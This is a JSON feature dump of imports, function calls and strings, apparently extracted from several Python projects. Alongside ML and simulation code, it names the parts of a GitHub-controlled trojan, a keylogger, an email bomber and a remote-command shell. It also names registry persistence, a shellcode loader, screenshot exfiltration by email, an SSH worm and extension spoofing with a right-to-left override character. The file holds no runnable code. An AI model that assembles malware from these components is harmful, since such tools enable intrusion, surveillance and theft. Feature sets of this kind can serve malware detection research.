{
    "Imports": [
        "Dataset",
        "config",
        "get_name",
        "ModelProcess",
        "ansi",
        "torch",
        "os",
        "ABC",
        "abstractmethod",
        "TYPE_CHECKING",
        "Config",
        "Model",
        "argparse",
        "config",
        "env",
        "get_class_subset",
        "split_dataset",
        "BasicObject",
        "get_name",
        "ansi",
        "torch",
        "numpy",
        "functools",
        "os",
        "ABC",
        "abstractmethod",
        "TYPE_CHECKING",
        "Iterable",
        "Config",
        "argparse",
        "Callable",
        "torch.utils.data",
        "datetime",
        "os",
        "numpy",
        "pygame",
        "Enum",
        "sys",
        "os",
        "numpy",
        "random",
        "sys",
        "os",
        "random",
        "git",
        "os",
        "shutil",
        "os",
        "sys",
        "smtplib",
        "base64",
        "github3",
        "importlib",
        "json",
        "random",
        "sys",
        "threading",
        "time",
        "datetime",
        "byref",
        "create_string_buffer",
        "c_ulong",
        "windll",
        "StringIO",
        "os",
        "pythoncom",
        "pyWinhook",
        "sys",
        "time",
        "win32clipboard",
        "Github",
        "socket",
        "datetime",
        "random",
        "os",
        "json",
        "time",
        "import_module",
        "requests",
        "json",
        "threading",
        "time",
        "os",
        "importlib.machinery",
        "game",
        "trojan",
        "threading",
        "mitmproxy",
        "subprocess",
        "os",
        "*",
        "config",
        "Dataset",
        "env",
        "KFAC",
        "EKFAC",
        "get_all_layer",
        "get_layer",
        "get_layer_name",
        "activate_params",
        "accuracy",
        "generate_target",
        "summary",
        "get_name",
        "BasicObject",
        "ansi",
        "prints",
        "add_noise",
        "train",
        "validate",
        "compare",
        "torch",
        "torch.nn",
        "numpy",
        "os",
        "OrderedDict",
        "Iterable",
        "TYPE_CHECKING",
        "Generator",
        "Iterator",
        "Mapping",
        "Self",
        "Config",
        "ExponentialMovingAverage",
        "Optimizer",
        "_LRScheduler",
        "WeightsEnum",
        "argparse",
        "Callable",
        "torch.utils.data",
        "Enum",
        "numpy",
        "displayVirusSpread",
        "nmap",
        "sys",
        "base64",
        "os",
        "socket",
        "subprocess",
        "winreg",
        "byref",
        "c_uint",
        "c_ulong",
        "sizeof",
        "Structure",
        "windll",
        "random",
        "sys",
        "time",
        "win32api",
        "base64",
        "win32api",
        "win32con",
        "win32gui",
        "win32ui",
        "socket",
        "os",
        "time",
        "socket",
        "request",
        "base64",
        "ctypes",
        "Network",
        "displayVirusSpread",
        "numpy",
        "base64",
        "sys",
        "os",
        "time",
        "os",
        "smtplib",
        "ImageGrab",
        "MIMEtext",
        "MIMEMultipart",
        "socket",
        "platform",
        "subprocess",
        "socket",
        "time",
        "displayVirusSpread",
        "fileMaker",
        "Network",
        "sleep",
        "fileMaker",
        "displayVirusSpread",
        "fileMaker",
        "sleep",
        "simulateVirusSpread",
        "displayVirusSpread",
        "viruses",
        "Network",
        "fileMaker",
        "time",
        "socket",
        "os",
        "sys",
        "pyHook",
        "pythoncom",
        "win32event",
        "win32api",
        "winerror",
        "win32console",
        "win32gui",
        "*",
        "simulateVirusSpread",
        "displayVirusSpread",
        "viruses",
        "Network",
        "fileMaker",
        "numpy",
        "matplotlib.pyplot",
        "subprocess",
        "os",
        "zipfile",
        "requests",
        "optparse",
        "*",
        "numpy",
        "Network",
        "time",
        "requests",
        "logging",
        "paramiko",
        "sys"
    ],
    "Function_Calls": [
        "get_name",
        "add_argument_group",
        "add_argument",
        "get_name",
        "get_name",
        "get_name",
        "update",
        "AttackType",
        "add_argument",
        "add_argument",
        "add_argument",
        "generate_target",
        "format",
        "get_config",
        "get_config",
        "keys",
        "isinstance",
        "join",
        "print",
        "update",
        "print",
        "join",
        "join",
        "print",
        "list",
        "list",
        "keys",
        "keys",
        "get_name",
        "add_argument_group",
        "add_argument",
        "get_name",
        "update",
        "DatasetType",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "__init__",
        "NotImplementedError",
        "_get_org_dataset",
        "split_dataset",
        "get_class_subset",
        "DataLoader",
        "exists",
        "to",
        "format",
        "keys",
        "join",
        "append",
        "normpath",
        "initialize",
        "_get_loader_dict",
        "get_dataloader",
        "get_dataloader",
        "get_org_dataset",
        "keys",
        "get_transform",
        "get_class_subset",
        "get_dataset",
        "join",
        "load",
        "get_dataset",
        "array",
        "reciprocal",
        "save",
        "print",
        "print",
        "super",
        "exists",
        "makedirs",
        "check_files",
        "print",
        "to",
        "to",
        "TypeError",
        "max",
        "max",
        "get_org_dataset",
        "get_org_dataset",
        "get_org_dataset",
        "split_dataset",
        "print",
        "print",
        "astype",
        "len",
        "print",
        "from_numpy",
        "get_config",
        "get_loss_weights",
        "type",
        "list",
        "from_numpy",
        "zip",
        "bincount",
        "list",
        "list",
        "keys",
        "keys",
        "strftime",
        "print",
        "open",
        "write",
        "now",
        "print",
        "listdir",
        "str",
        "drawGraphFromFile",
        "drawGraphFromFile",
        "drawGraphFromFile",
        "drawGraphFromFile",
        "drawGraphFromFile",
        "drawGraphFromFile",
        "load",
        "scale",
        "append",
        "walkTree",
        "sort",
        "range",
        "Clock",
        "init",
        "set_mode",
        "append",
        "array",
        "startAnimation",
        "open",
        "append",
        "walkTree",
        "append",
        "int",
        "int",
        "amax",
        "append",
        "range",
        "round",
        "round",
        "append",
        "len",
        "nodeToLocations",
        "get",
        "fill",
        "range",
        "range",
        "update",
        "tick",
        "getComputerLocationsOnDisplay",
        "int",
        "treeNode",
        "treeNode",
        "astype",
        "append",
        "int",
        "int",
        "amax",
        "range",
        "len",
        "range",
        "blit",
        "distanceBetweenTwoPoints",
        "lines",
        "astype",
        "append",
        "int",
        "int",
        "amax",
        "range",
        "quit",
        "exit",
        "len",
        "print",
        "append",
        "lines",
        "lines",
        "range",
        "lines",
        "roundTuple",
        "roundTuple",
        "len",
        "append",
        "find",
        "append",
        "append",
        "array",
        "astype",
        "append",
        "int",
        "int",
        "amax",
        "range",
        "nodeToLocations",
        "delay",
        "lines",
        "nodeToLocations",
        "split",
        "split",
        "array",
        "astype",
        "append",
        "buildTreeComputerLocations",
        "lines",
        "sin",
        "cos",
        "array",
        "amax",
        "range",
        "lines",
        "sin",
        "cos",
        "array",
        "astype",
        "append",
        "int",
        "int",
        "int",
        "int",
        "lines",
        "sin",
        "cos",
        "int",
        "int",
        "int",
        "int",
        "lines",
        "find",
        "sin",
        "cos",
        "array",
        "int",
        "int",
        "int",
        "int",
        "int",
        "int",
        "int",
        "int",
        "print",
        "open",
        "range",
        "close",
        "print",
        "zeros",
        "open",
        "range",
        "range",
        "close",
        "print",
        "zeros",
        "open",
        "range",
        "range",
        "close",
        "open",
        "range",
        "writePairs",
        "close",
        "print",
        "open",
        "range",
        "close",
        "print",
        "open",
        "close",
        "print",
        "write",
        "write",
        "write",
        "write",
        "line",
        "ring",
        "star",
        "tree",
        "fullConnected",
        "mesh",
        "Exception",
        "writePairs",
        "Exception",
        "writePairs",
        "range",
        "Exception",
        "range",
        "Exception",
        "writePairs",
        "Exception",
        "writePairs",
        "Exception",
        "str",
        "str",
        "writePairs",
        "writePairs",
        "writePairs",
        "random",
        "writePairs",
        "write",
        "write",
        "open",
        "write",
        "_map_files_recursive",
        "listdir",
        "join",
        "isdir",
        "basename",
        "_map_files_recursive",
        "write",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "welcome_message",
        "get_max_tries",
        "randint",
        "print",
        "print",
        "int",
        "choose_difficulty",
        "int",
        "input",
        "print",
        "choose_difficulty",
        "print",
        "input",
        "print",
        "append",
        "print",
        "print",
        "clone_from",
        "join",
        "exists",
        "close",
        "rmtree",
        "clone_from",
        "join",
        "join",
        "remove",
        "join",
        "copy2",
        "rmtree",
        "clone_from",
        "exists",
        "join",
        "copytree",
        "rmtree",
        "clone_from",
        "join",
        "join",
        "exists",
        "copytree",
        "add",
        "commit",
        "remote",
        "push",
        "close",
        "rmtree",
        "print",
        "rmtree",
        "rmtree",
        "open",
        "read",
        "str",
        "SMTP",
        "starttls",
        "input",
        "input",
        "print",
        "login",
        "print",
        "input",
        "print",
        "int",
        "input",
        "range",
        "quit",
        "system",
        "input",
        "int",
        "sendmail",
        "input",
        "input",
        "login",
        "repository",
        "append",
        "Trojan",
        "run",
        "open",
        "read",
        "strip",
        "file_contents",
        "github_connect",
        "get_file_contents",
        "loads",
        "run",
        "store_module_result",
        "isoformat",
        "bytes",
        "create_file",
        "print",
        "github_connect",
        "get_file_contents",
        "spec_from_loader",
        "module_from_spec",
        "exec",
        "GitImporter",
        "b64decode",
        "b64encode",
        "get_config",
        "sleep",
        "b64decode",
        "exec",
        "now",
        "Thread",
        "start",
        "sleep",
        "randint",
        "randint",
        "StringIO",
        "KeyLogger",
        "HookManager",
        "HookKeyboard",
        "getvalue",
        "print",
        "print",
        "GetForegroundWindow",
        "c_ulong",
        "GetWindowThreadProcessId",
        "create_string_buffer",
        "OpenProcess",
        "GetModuleBaseNameA",
        "create_string_buffer",
        "GetWindowTextA",
        "print",
        "CloseHandle",
        "CloseHandle",
        "thread_time",
        "PumpWaitingMessages",
        "run",
        "byref",
        "byref",
        "byref",
        "decode",
        "decode",
        "get_current_process",
        "print",
        "print",
        "chr",
        "OpenClipboard",
        "GetClipboardData",
        "CloseClipboard",
        "print",
        "print",
        "Trojan",
        "run",
        "main",
        "Github",
        "gethostname",
        "strftime",
        "int",
        "join",
        "exists",
        "makedirs",
        "sleep",
        "open",
        "load",
        "uniform",
        "exists",
        "generate_unique_id",
        "create_directory_in_logs",
        "run_modules",
        "send_logs_to_github",
        "check_remote_repo",
        "import_module",
        "log",
        "today",
        "load_modules",
        "get_config",
        "run_modules",
        "send_logs_to_github",
        "getattr",
        "Trojan",
        "start",
        "main",
        "__update_config",
        "Thread",
        "ModuleLoader",
        "start",
        "get",
        "loads",
        "load_module",
        "sleep",
        "sleep",
        "decode",
        "get",
        "isfile",
        "load_module",
        "__update_config",
        "isdir",
        "mkdir",
        "remove",
        "open",
        "write",
        "print",
        "SourceFileLoader",
        "run",
        "decode",
        "Thread",
        "Thread",
        "start",
        "start",
        "endswith",
        "print",
        "print",
        "Trojan",
        "create",
        "compile",
        "make",
        "tuple",
        "split",
        "print",
        "split",
        "rename",
        "zip",
        "split",
        "join",
        "split",
        "reversed",
        "set",
        "no_grad",
        "no_grad",
        "no_grad",
        "get_name",
        "get_name",
        "get_model_class",
        "add_argument_group",
        "get_model_class",
        "add_argument",
        "get_name",
        "get_name",
        "update",
        "sorted",
        "get_model_class",
        "ModelType",
        "get_available_models",
        "sorted",
        "keys",
        "KeyError",
        "__init__",
        "define_preprocess",
        "define_features",
        "AdaptiveAvgPool2d",
        "Flatten",
        "define_classifier",
        "Identity",
        "Identity",
        "Sequential",
        "get_final_fm",
        "classifier",
        "features",
        "get_fm",
        "pool",
        "flatten",
        "__call__",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "add_argument",
        "__init__",
        "get",
        "define_criterion",
        "define_criterion",
        "Softmax",
        "get_parallel_model",
        "activate_params",
        "eval",
        "get_fm",
        "get_final_fm",
        "softmax",
        "flatten",
        "argmax",
        "get_layer_name",
        "get_all_layer",
        "get_layer",
        "criterion",
        "isinstance",
        "OptimType",
        "CrossEntropyLoss",
        "state_dict",
        "save",
        "get_state_dict",
        "get",
        "train",
        "get",
        "validate",
        "compare",
        "accuracy",
        "activate_params",
        "summary",
        "summary",
        "prints",
        "train",
        "train",
        "eval",
        "eval",
        "cpu",
        "cpu",
        "cuda",
        "cuda",
        "zero_grad",
        "state_dict",
        "load_state_dict",
        "parameters",
        "named_parameters",
        "children",
        "named_children",
        "modules",
        "named_modules",
        "apply",
        "requires_grad_",
        "get_data",
        "get_class",
        "eq",
        "generate_target",
        "get_logits",
        "format",
        "isinstance",
        "join",
        "keys",
        "prints",
        "prints",
        "print",
        "len",
        "lower",
        "len",
        "add_module",
        "range",
        "add_module",
        "preprocess",
        "append",
        "extend",
        "normpath",
        "get",
        "load",
        "load",
        "cuda",
        "range",
        "mean",
        "model",
        "self",
        "get_layer_name",
        "insert",
        "append",
        "self",
        "getattr",
        "keys",
        "normpath",
        "get_official_weights",
        "next",
        "prints",
        "cuda",
        "normpath",
        "dirname",
        "exists",
        "makedirs",
        "prints",
        "getattr",
        "callable",
        "callable",
        "callable",
        "callable",
        "callable",
        "hasattr",
        "getattr",
        "hasattr",
        "getattr",
        "callable",
        "get_data",
        "DataParallel",
        "print",
        "values",
        "print",
        "keys",
        "format",
        "items",
        "super",
        "Linear",
        "add_module",
        "Linear",
        "super",
        "super",
        "exists",
        "makedirs",
        "isinstance",
        "TypeError",
        "to",
        "to",
        "model",
        "TypeError",
        "add_noise",
        "append",
        "tensor",
        "gather",
        "self",
        "get_parameter_from_name",
        "TypeError",
        "items",
        "SequentialLR",
        "join",
        "reversed",
        "popitem",
        "popitem",
        "load",
        "OrderedDict",
        "OrderedDict",
        "load_state_dict",
        "join",
        "callable",
        "callable",
        "super",
        "parameters",
        "parameters",
        "parameters",
        "NotImplementedError",
        "autocast",
        "get_logits",
        "get_config",
        "get_config",
        "get_config",
        "lower",
        "list",
        "len",
        "Linear",
        "add_module",
        "add_module",
        "type",
        "model",
        "stack",
        "len",
        "self",
        "get_fm",
        "get_final_fm",
        "StepLR",
        "CosineAnnealingLR",
        "ExponentialLR",
        "NotImplementedError",
        "values",
        "len",
        "print",
        "prints",
        "get_available_models",
        "len",
        "len",
        "keys",
        "split",
        "activation",
        "Dropout",
        "len",
        "from_numpy",
        "get_prob",
        "unsqueeze",
        "LinearLR",
        "ConstantLR",
        "NotImplementedError",
        "list",
        "list",
        "type",
        "type",
        "removeprefix",
        "items",
        "removeprefix",
        "items",
        "keys",
        "keys",
        "uniform",
        "drawGraphFromFile",
        "int",
        "int",
        "append",
        "Node",
        "append",
        "append",
        "append",
        "Node",
        "append",
        "append",
        "PortScanner",
        "scan",
        "open",
        "all_hosts",
        "write",
        "write",
        "write",
        "system",
        "OpenKey",
        "socket",
        "connect",
        "send",
        "close",
        "autorun",
        "shell",
        "main",
        "recv",
        "Popen",
        "b64encode",
        "send",
        "EnumValue",
        "append",
        "OpenKey",
        "SetValueEx",
        "Close",
        "int",
        "read",
        "read",
        "LAST_INPUT_INFO",
        "sizeof",
        "GetLastInputInfo",
        "GetTickCount",
        "print",
        "Detector",
        "detect",
        "print",
        "run",
        "byref",
        "range",
        "randint",
        "randint",
        "get_last_input",
        "GetAsyncKeyState",
        "exit",
        "get_key_press",
        "time",
        "time",
        "exit",
        "GetSystemMetrics",
        "GetSystemMetrics",
        "GetSystemMetrics",
        "GetSystemMetrics",
        "GetDesktopWindow",
        "get_dimensions",
        "GetWindowDC",
        "CreateDCFromHandle",
        "CreateCompatibleDC",
        "CreateBitmap",
        "CreateCompatibleBitmap",
        "SelectObject",
        "BitBlt",
        "SaveBitmapFile",
        "DeleteDC",
        "DeleteObject",
        "screenshot",
        "screenshot",
        "GetHandle",
        "open",
        "read",
        "system",
        "main",
        "RemoteCommands",
        "send",
        "recv",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "input",
        "send",
        "sleep",
        "send",
        "print",
        "send",
        "decode",
        "print",
        "send",
        "decode",
        "decode",
        "print",
        "print",
        "print",
        "print",
        "print",
        "print",
        "input",
        "send",
        "sleep",
        "send",
        "decode",
        "print",
        "send",
        "lower",
        "decode",
        "decode",
        "split",
        "remove",
        "send",
        "decode",
        "print",
        "send",
        "print",
        "input",
        "send",
        "decode",
        "decode",
        "int",
        "decode",
        "print",
        "input",
        "send",
        "sleep",
        "send",
        "sleep",
        "send",
        "print",
        "input",
        "send",
        "decode",
        "decode",
        "int",
        "print",
        "send",
        "lower",
        "socket",
        "setsockopt",
        "print",
        "bind",
        "listen",
        "len",
        "recv",
        "print",
        "encode",
        "print",
        "open",
        "write",
        "print",
        "open",
        "write",
        "encode",
        "print",
        "open",
        "close",
        "system",
        "system",
        "send",
        "print",
        "remove",
        "open",
        "send",
        "print",
        "remove",
        "print",
        "print",
        "lower",
        "encode",
        "print",
        "decode",
        "isfile",
        "print",
        "encode",
        "encode",
        "open",
        "send",
        "encode",
        "print",
        "decode",
        "open",
        "write",
        "send",
        "input",
        "send",
        "decode",
        "print",
        "print",
        "exit",
        "print",
        "exit",
        "accept",
        "split",
        "print",
        "startswith",
        "startswith",
        "decode",
        "decode",
        "recv",
        "recvall",
        "decode",
        "recv",
        "recv",
        "recvall",
        "recv",
        "input",
        "read",
        "recv",
        "recv",
        "recv",
        "send",
        "print",
        "recv",
        "recv",
        "recvall",
        "read",
        "decode",
        "recv",
        "recv",
        "recvall",
        "input",
        "encode",
        "print",
        "send",
        "input",
        "input",
        "send",
        "decode",
        "print",
        "send",
        "print",
        "strip",
        "print",
        "exit",
        "int",
        "int",
        "input",
        "system",
        "decode",
        "recv",
        "basename",
        "str",
        "recv",
        "recv",
        "encode",
        "print",
        "UsableCommands",
        "send",
        "print",
        "exit",
        "print",
        "exit",
        "decode",
        "recv",
        "recv",
        "str",
        "recv",
        "str",
        "print",
        "getsize",
        "recv",
        "recv",
        "lower",
        "system",
        "len",
        "send",
        "print",
        "print",
        "recv",
        "send",
        "print",
        "close",
        "recv",
        "encode",
        "decode",
        "input",
        "send",
        "print",
        "close",
        "input",
        "send",
        "sleep",
        "send",
        "print",
        "recv",
        "encode",
        "OpenWebpage",
        "decode",
        "Screenshot",
        "join",
        "Webcam",
        "recv",
        "split",
        "join",
        "SystemInformation",
        "split",
        "StartProcess",
        "strftime",
        "PythonInterpreter",
        "localtime",
        "strftime",
        "RemoteCMD",
        "localtime",
        "send",
        "print",
        "send",
        "print",
        "send",
        "print",
        "decode",
        "send",
        "print",
        "decode",
        "ViewFiles",
        "recv",
        "decode",
        "decode",
        "SendFile",
        "recv",
        "send",
        "ReceiveFile",
        "recv",
        "recv",
        "Delete",
        "print",
        "socket",
        "bind",
        "listen",
        "print",
        "accept",
        "print",
        "send",
        "split",
        "print",
        "input",
        "encode",
        "print",
        "len",
        "print",
        "input",
        "decode",
        "print",
        "recv",
        "len",
        "VirtualAlloc",
        "RtlMoveMemory",
        "create_string_buffer",
        "write_memory",
        "cast",
        "shell_func",
        "get_code",
        "run",
        "urlopen",
        "decodebytes",
        "CFUNCTYPE",
        "read",
        "dataToDisplay",
        "append",
        "count",
        "array",
        "where",
        "percentage",
        "range",
        "checkRate",
        "append",
        "append",
        "nowhereToGo",
        "len",
        "len",
        "percentage",
        "append",
        "len",
        "display",
        "infectOrNot",
        "append",
        "grab",
        "save",
        "open",
        "read",
        "b64encode",
        "close",
        "remove",
        "SMTP",
        "starttls",
        "input",
        "input",
        "login",
        "sendmail",
        "quit",
        "system",
        "socket",
        "connect",
        "send",
        "decode",
        "send_to_server",
        "encode",
        "recv",
        "print",
        "print",
        "open",
        "gethostname",
        "write",
        "system",
        "write",
        "release",
        "write",
        "strip",
        "write",
        "strip",
        "write",
        "strip",
        "write",
        "write",
        "write",
        "run",
        "run",
        "run",
        "dataToDisplay",
        "append",
        "append",
        "append",
        "append",
        "append",
        "append",
        "append",
        "display",
        "range",
        "print",
        "range",
        "print",
        "print",
        "print",
        "print",
        "print",
        "type",
        "range",
        "print",
        "Network",
        "range",
        "maker",
        "createnetwork",
        "len",
        "print",
        "print",
        "str",
        "str",
        "print",
        "range",
        "range",
        "range",
        "range",
        "range",
        "range",
        "dataToDisplay",
        "line",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "dataToDisplay",
        "ring",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "dataToDisplay",
        "star",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "dataToDisplay",
        "fullConnected",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "dataToDisplay",
        "tree",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "dataToDisplay",
        "mesh",
        "sleep",
        "append",
        "drawGraphFromFile",
        "display",
        "Network",
        "createnetwork",
        "runOnce",
        "sleep",
        "AddProgramToStartup",
        "HookManager",
        "HookKeyboard",
        "PumpMessages",
        "dirname",
        "OpenKey",
        "SetValueEx",
        "socket",
        "connect",
        "send",
        "close",
        "GetConsoleWindow",
        "ShowWindow",
        "HideCmd",
        "SendToRemoteServer",
        "system",
        "system",
        "system",
        "realpath",
        "chr",
        "Worm",
        "range",
        "reshape",
        "print",
        "array",
        "array",
        "array",
        "array",
        "array",
        "array",
        "figure",
        "plot",
        "plot",
        "plot",
        "plot",
        "plot",
        "plot",
        "xlabel",
        "ylabel",
        "legend",
        "title",
        "show",
        "len",
        "main",
        "Network",
        "createnetwork",
        "Network",
        "createnetwork",
        "Network",
        "createnetwork",
        "Network",
        "createnetwork",
        "Network",
        "createnetwork",
        "Network",
        "createnetwork",
        "runOnce",
        "runOnce",
        "runOnce",
        "runOnce",
        "runOnce",
        "runOnce",
        "append",
        "append",
        "append",
        "append",
        "append",
        "append",
        "replace",
        "set_icon",
        "call",
        "chdir",
        "write",
        "replace",
        "get",
        "open",
        "write",
        "dirname",
        "isfile",
        "print",
        "print",
        "dirname",
        "split",
        "split",
        "open",
        "write",
        "close",
        "realpath",
        "ZipFile",
        "split",
        "split",
        "split",
        "OptionParser",
        "add_option",
        "add_option",
        "add_option",
        "add_option",
        "add_option",
        "parse_args",
        "Trojan",
        "create",
        "compile",
        "error",
        "error",
        "error",
        "zip",
        "uniform",
        "uniform",
        "int",
        "uniform",
        "chooseTarget",
        "round",
        "len",
        "int",
        "sleep",
        "time",
        "sleep",
        "len",
        "sleep",
        "get",
        "open",
        "write",
        "json",
        "basicConfig",
        "setLevel",
        "Worm",
        "spread_via_ssh",
        "split",
        "range",
        "SSHClient",
        "load_system_host_keys",
        "set_missing_host_key_policy",
        "generate_addresses_on_network",
        "str",
        "AutoAddPolicy",
        "debug",
        "getLogger",
        "join",
        "format",
        "connect",
        "debug",
        "open_sftp",
        "format",
        "get",
        "debug",
        "put",
        "print",
        "close",
        "close",
        "debug",
        "debug",
        "format"
    ],
    "Strings": [
        "attack",
        "Main attack method (need overriding).",
        "attack",
        "folder_path",
        "--attack",
        "--output",
        "--attack_dir",
        "default_dataset",
        "attack_dir",
        "folder_path",
        "attack_name",
        "output level (default: 0)",
        "directory to contain attack results",
        "--attack",
        "{yellow}attack{reset}",
        "-d",
        "--dataset",
        "-m",
        "--model",
        "--attack",
        "dataset",
        "you need to first claim the attack name using \"--attack\".",
        "red",
        "reset",
        "dataset",
        "folder_path",
        "-d",
        "--dataset",
        "--batch_size",
        "--valid_batch_size",
        "--num_workers",
        "--download",
        "--data_dir",
        "dataset",
        "num_classes",
        "batch_size",
        "valid_batch_size",
        "folder_path",
        "num_workers",
        "train",
        "valid",
        "transform",
        "default_dataset",
        "default_dataset",
        "folder_path",
        "dataset_name",
        "dataset name (lowercase)",
        "batch size (negative number means batch_size for each gpu)",
        "valid batch size",
        "num_workers passed to torch.utils.data.DataLoader (default: 4)",
        "store_true",
        "download dataset if not exist by calling self.initialize()",
        "directory to contain datasets",
        "split_ratio",
        "transform",
        "data_seed",
        "train",
        "num_gpus",
        "loss_weights.npy",
        "train",
        "-d",
        "--dataset",
        "dataset",
        "{yellow}dataset{reset}",
        "-d",
        "--dataset",
        "dataset",
        "dataset",
        "data_dir",
        "train",
        "valid",
        "train",
        "valid",
        "Calculating Loss Weights",
        "Loss Weights Saved at ",
        "device",
        "dataset",
        "Dataset Folder Path: ",
        "num_gpus",
        "num_gpus",
        "valid",
        "train",
        "valid",
        "train",
        "train",
        "valid",
        "self.folder_path=",
        "device",
        "device",
        "Log in een bestand wanneer de hacker een nieuwe pc heeft ",
        "%Y-%m-%d_%H-%M-%S",
        "logs/",
        "/log_",
        ".txt",
        "a",
        "Hallo ik ben op ",
        "In dirlister module.",
        ".",
        "fullconnect.txt",
        "line.txt",
        "mesh.txt",
        "ring.txt",
        "star.txt",
        "tree.txt",
        "compImage.png",
        "1",
        "r",
        "#",
        "\t",
        "\t",
        "In environment module.",
        "line.txt",
        "fullconnect.txt",
        "mesh.txt",
        "ring.txt",
        "star.txt",
        "tree.txt",
        "w",
        "Line File made. File is named ",
        "w",
        "Fully connected File made. File is named ",
        "w",
        "w",
        "Ring File made. File is named ",
        "w",
        "Star File made. File is named ",
        "w",
        "Tree File made. File is named ",
        "\t",
        "Cannot create shape with 1 node",
        "Cannot create shape with 1 node",
        "Cannot create shape with 1 node",
        "Cannot create shape with 1 node",
        "Cannot create shape with 1 node",
        "Cannot create shape with 1 node",
        "Functie die map /home gaat loggen helemaal  ",
        "/home",
        "logs/",
        "/log_folders.txt",
        "    ",
        "a",
        "[",
        "  ",
        "Welcome to \"Guess a Number!\"",
        "[0] Easy",
        "[1] Medium",
        "[2] Hard",
        "[3] Legend",
        "Enter a guess between 0 and 100",
        "You got it after ",
        " tries!",
        "Your choice: ",
        "Please choose typing 1, 2 or 3.",
        "You lost!",
        "You won!",
        "/",
        ": ",
        " > ",
        "hint: the actual number is smaller",
        "hint: the actual number is larger",
        "Deze funcite zal de repo controleren of er een config file beschickbaar is zoja return yes ",
        "Nieuwe config halen van github en de oude verwijderen",
        "Modules inladen van github ",
        "temp_directory",
        "temp_directory",
        "config",
        "temp_directory",
        "temp_directory",
        "config",
        "config.txt",
        "config",
        "config.txt",
        "config.txt",
        "modules",
        "modules",
        "modules",
        "logs",
        "logs",
        "logs",
        "Add new log entries",
        "modules",
        "origin",
        "r",
        "An error occurred: ",
        "smtp.gmail.com",
        "Enter Your Email : ",
        "please enter your password ",
        "User not logged in",
        "Successfully Signed in",
        "Please Enter Your Victim Email : ",
        "Amount of bombarding messages?",
        "pip install smtplib",
        "Count : ",
        "hello123@gmail.com",
        "Enter your Github repository: ",
        "Enter your Github username: ",
        "Github-aware trojan",
        " Every time the interpreter needs to load a module but is not available, it will use this class",
        "__main__",
        "",
        "test",
        "weathertoday.txt",
        ".json",
        "data/",
        "config",
        "data/",
        "/",
        ".data",
        "utf-8",
        "modules",
        "/",
        "%r",
        "Attempting to retrieve %s",
        ".py",
        "module",
        "import %s",
        "module",
        "module",
        "__main__",
        " Captures the active window and its associated process ID ",
        "done.",
        "V",
        "",
        ": window name unknown",
        "[PASTE] - ",
        "__main__",
        "",
        "Deze functie zal de applicatie runnen ",
        "Deze functie zal alle modules inladen van de config en ze ook runnen ",
        "config/config.txt",
        "Deze functie zal unique id maken op basis van de hostname + datum + een random nummer",
        "Deze functie zal een map aanmaken in de map logs op basis van de hostname + datum ",
        "logs",
        "git@github.com:laurensDSM/test0.git",
        "%Y%m%d",
        "_",
        "_",
        "r",
        "module_name",
        "class_name",
        "modules.",
        "b494b07e-5e27-4073-8db2-f550d60308e4",
        "https://gitlab.com/threetoes/config-repo/raw/master/modules/",
        "__main__",
        ".json",
        ".py",
        "https://gitlab.com/threetoes/config-repo/raw/master/config/",
        "modules",
        "utf-8",
        "modules/",
        ".py",
        "./modules",
        "./modules",
        "w",
        "name",
        "utf-8",
        "192.168.188.171",
        "http://192.168.188.171/file.exe",
        "/var/www/html/",
        ".exe",
        ".pdf",
        "[+] Got interesting flow",
        "#",
        ".exe",
        "",
        ".",
        "[+] Generating a trojan for ",
        "[+] Renaming trojan to spoof its extension",
        "exe",
        "/",
        "Location",
        ".",
        ".exe",
        ".zip",
        "http://",
        "/",
        "\u202e",
        "/",
        "",
        "_Model",
        "Model",
        "add_argument",
        "create",
        "output_available_models",
        "``x -> self.get_final_fm -> self.classifier -> return``",
        "``x -> self.preprocess -> self.features -> return``",
        "``x -> self.get_fm -> self.pool -> self.flatten -> return``",
        "model",
        "",
        "input",
        "",
        "classifier",
        "input",
        "mean",
        "full",
        "SGD",
        "CosineAnnealingLR",
        "constant",
        "cpu",
        "full",
        "",
        "cpu",
        "Train",
        "train",
        "",
        "Train the model",
        "Validate",
        "valid",
        "",
        "Validate",
        "",
        "",
        "",
        "full",
        "-m",
        "--model",
        "--suffix",
        "--pretrained",
        "--official",
        "--randomized_smooth",
        "--rs_sigma",
        "--rs_n",
        "--model_dir",
        "model",
        "folder_path",
        "",
        "loss_weights",
        "num_gpus",
        "input",
        "momentum",
        "weight_decay",
        "weight",
        "official",
        "num_gpus",
        "features",
        "forward_fn",
        "forward_fn",
        "forward_fn",
        "forward_fn",
        "default_dataset",
        "default_model",
        "default_dataset",
        "default_model",
        "default_model",
        "folder_path",
        "folder_path",
        " not in ",
        "fc",
        "model_name",
        "model name (default: config[model][default_model])",
        "model name suffix (e.g., \"_adv_train\")",
        "store_true",
        "load local pretrained weights (default: False)",
        "store_true",
        "load official pretrained weights (default: False)",
        "whether to use randomized smoothing (default: False)",
        "randomized smoothing sampling std (default: 0.01)",
        "randomized smoothing sampling number (default: 100)",
        "directory to store pretrained models",
        "suffix",
        "loss_weights",
        "none",
        "official",
        "input",
        "output",
        "none",
        "weight",
        "default",
        "device",
        "features",
        "classifier",
        "classifier",
        "DEFAULT",
        "train",
        "epoch_fn",
        "epoch_fn",
        "after_loss_fn",
        "after_loss_fn",
        "valid",
        "valid",
        "num_gpus",
        "verbose",
        "-",
        "features",
        "full",
        "-d",
        "--dataset",
        "dataset",
        "-m",
        "--model",
        "model",
        "{yellow}model{reset}",
        "-d",
        "--dataset",
        "-m",
        "--model",
        "dataset",
        "model",
        "model",
        "model_dir",
        "fc",
        "randomized_smooth",
        "rs_sigma",
        "rs_n",
        "classifier",
        "features",
        "flatten",
        "StepLR",
        "CosineAnnealingLR",
        "ExponentialLR",
        "features",
        "full",
        "component=",
        "Model ",
        " loaded from: ",
        "",
        "component=",
        "Model ",
        " saved at: ",
        "classifier",
        "partial",
